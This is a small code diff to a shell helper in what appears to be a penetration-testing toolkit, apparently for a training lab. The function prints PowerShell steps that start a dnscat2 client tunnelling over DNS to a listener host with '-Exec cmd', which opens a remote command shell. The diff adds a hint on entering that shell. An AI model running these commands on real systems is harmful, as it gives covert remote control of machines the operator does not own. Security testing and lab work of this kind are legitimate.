@@ -169,4 +169,6 @@ nb-pivot-dnscat2-client() {
     __info "Run the following commands on the target (powershell):"
     __ok "Import-Module .\\dnscat2.ps1"
     __ok "Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret $key -Exec cmd"
+    echo
+    __info "You can drop into a shell using 'window -i 1'"
 }
